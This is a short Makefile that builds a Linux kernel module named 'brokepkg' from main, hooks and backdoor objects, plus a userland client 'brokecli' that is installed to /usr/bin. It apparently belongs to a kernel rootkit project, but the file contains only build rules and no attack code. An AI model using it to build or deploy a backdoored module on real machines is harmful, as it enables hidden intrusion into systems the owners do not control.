obj-m := brokepkg.o
brokepkg-objs := src/main.o src/hooks.o src/backdoor.o
CC := gcc
KDIR := /lib/modules/$(shell uname -r)/build
CLIENT_NAME = brokecli
ccflags-y += -I$(PWD)/include -Wall
PWD := $(shell pwd)
CLIENT_DIR := $(PWD)/userland

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

client:
	$(MAKE) -C $(CLIENT_DIR) NAME=$(CLIENT_NAME)

client-clean:
	$(MAKE) -C $(CLIENT_DIR) NAME=$(CLIENT_NAME) clean

client-install:
	mv $(CLIENT_DIR)/$(CLIENT_NAME) /usr/bin